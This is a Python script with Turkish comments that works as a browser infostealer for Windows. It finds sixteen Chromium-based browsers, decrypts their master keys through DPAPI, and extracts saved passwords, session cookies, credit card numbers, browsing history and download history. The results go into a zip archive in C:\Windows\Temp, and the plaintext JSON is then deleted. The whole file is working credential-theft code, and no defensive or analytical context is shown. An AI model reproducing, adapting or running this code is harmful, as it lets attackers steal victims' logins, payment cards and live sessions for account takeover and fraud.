import os
import json
import base64
import sqlite3
import shutil
from win32crypt import CryptUnprotectData  # type: ignore
from Crypto.Cipher import AES
from datetime import datetime

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def save_results(results):
    if not os.path.exists(user + '\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user + '\\AppData\\Local\\Temp\\Browser')
    
    # JSON dosyası oluşturma
    file_path = r'C:\Windows\Temp\browser_data.json'
    with open(file_path, 'w', encoding="utf-8") as f:
        json.dump(results, f, indent=4)

    # Zip dosyası oluşturma
    shutil.make_archive(r'C:\Windows\Temp\browser_data', 'zip', r'C:\Windows\Temp', 'browser_data.json')
    
    # Önemli dosyayı sil
    os.remove(file_path)
    
    print("Veriler başarıyla JSON formatında kaydedildi ve zip dosyasına dönüştürüldü.")

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return []
    
    result = []
    shutil.copy(login_db, user + '\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user + '\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result.append({
            "URL": row[0],
            "Email": row[1],
            "Password": password
        })
    conn.close()
    os.remove(user + '\\AppData\\Local\\Temp\\login_db')
    return result

def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return []

    result = []
    shutil.copy(cards_db, user + '\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user + '\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result.append({
            "Name Card": row[0],
            "Card Number": card_number,
            "Expires": f"{row[1]} / {row[2]}",
            "Added": datetime.fromtimestamp(row[4]).strftime('%Y-%m-%d %H:%M:%S')
        })

    conn.close()
    os.remove(user + '\\AppData\\Local\\Temp\\cards_db')
    return result

def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return []
    
    result = []
    shutil.copy(cookie_db, user + '\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user + '\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result.append({
            "Host Key": row[0],
            "Cookie Name": row[1],
            "Path": row[2],
            "Cookie": cookie,
            "Expires On": row[4]
        })

    conn.close()
    os.remove(user + '\\AppData\\Local\\Temp\\cookie_db')
    return result

def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = []
    if not os.path.exists(web_history_db):
        return []

    shutil.copy(web_history_db, user + '\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user + '\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result.append({
            "URL": row[0],
            "Title": row[1],
            "Visited Time": row[2]
        })
    conn.close()
    os.remove(user + '\\AppData\\Local\\Temp\\web_history_db')
    return result

def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return []
    
    result = []
    shutil.copy(downloads_db, user + '\\AppData\\Local\\Temp\\downloads_db')
    conn = sqlite3.connect(user + '\\AppData\\Local\\Temp\\downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result.append({
            "Download URL": row[0],
            "Local Path": row[1]
        })

    conn.close()
    os.remove(user + '\\AppData\\Local\\Temp\\downloads_db')
    return result

def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def mainpass():
    available_browsers = installed_browsers()
    results = {}

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        results[browser] = {
            "Saved_Passwords": get_login_data(browser_path, 'Default', master_key),
            "Browser_History": get_web_history(browser_path, 'Default'),
            "Download_History": get_downloads(browser_path, 'Default'),
            "Browser_Cookies": get_cookies(browser_path, 'Default', master_key),
            "Saved_Credit_Cards": get_credit_cards(browser_path, 'Default', master_key)
        }

    # Verileri JSON formatında kaydet
    save_results(results)

if __name__ == "__main__":
    mainpass()
